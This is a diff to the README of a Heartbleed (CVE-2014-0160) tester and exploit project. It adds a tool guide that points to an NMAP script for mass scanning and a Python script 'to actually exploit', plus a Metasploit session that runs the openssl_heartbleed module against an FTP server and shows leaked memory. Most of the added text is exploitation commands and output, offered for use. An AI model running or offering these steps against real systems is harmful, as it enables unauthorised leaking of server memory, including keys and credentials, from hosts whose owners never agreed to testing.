@@ -1,6 +1,16 @@
 HeartBleed Tester & Exploit
 ---------------------------
 
+Tool Guide
+----------
+
+* If you want to mass scan, the NMAP script is currently your best bet.
+* For the largest number of protocols supports (STARTTLS) check the modified Metasploit script
+* If you want to actually exploit, use the python script (mods required for STARTTLS on non-smtp)
+
+Python Tool
+-----------
+
 Usage: heartbleed-poc.py server [options]
 
 Test for SSL heartbeat vulnerability (CVE-2014-0160)
@@ -72,3 +82,36 @@ PORT    STATE SERVICE
 |_      http://cvedetails.com/cve/2014-0160/
 
 Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
+
+Metasploit Module
+-----------------
+
+msf > use auxiliary/scanner/ssl/openssl_heartbleed 
+msf auxiliary(openssl_heartbleed) > show options
+
+Module options (auxiliary/scanner/ssl/openssl_heartbleed):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   RHOSTS                       yes       The target address range or CIDR identifier
+   RPORT       443              yes       The target port
+   STARTTLS    None             yes       Protocol to use with STARTTLS, None to avoid STARTTLS  (accepted: None, SMTP, IMAP, JABBER, POP3, FTP)
+   THREADS     1                yes       The number of concurrent threads
+   TLSVERSION  1.0              yes       TLS version to use (accepted: 1.0, 1.1, 1.2)
+
+msf auxiliary(openssl_heartbleed) > set rhosts example.org
+rhosts => example.org
+msf auxiliary(openssl_heartbleed) > set STARTTLS FTP
+STARTTLS => FTP
+msf auxiliary(openssl_heartbleed) > set PORT 21
+PORT => 21
+msf auxiliary(openssl_heartbleed) > exploit
+
+[*] 37.187.134.197:21 - Trying to start SSL via FTP
+[*] 37.187.134.197:21 - Sending Client Hello...
+[*] 37.187.134.197:21 - Sending Heartbeat...
+[*] 37.187.134.197:21 - Heartbeat response, checking if there is data leaked...
+[+] 37.187.134.197:21 - Heartbeat response with leak
+[*] 37.187.134.197:21 - Printable info leaked: @SE F(CKMIWsf"!98532ED/A
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
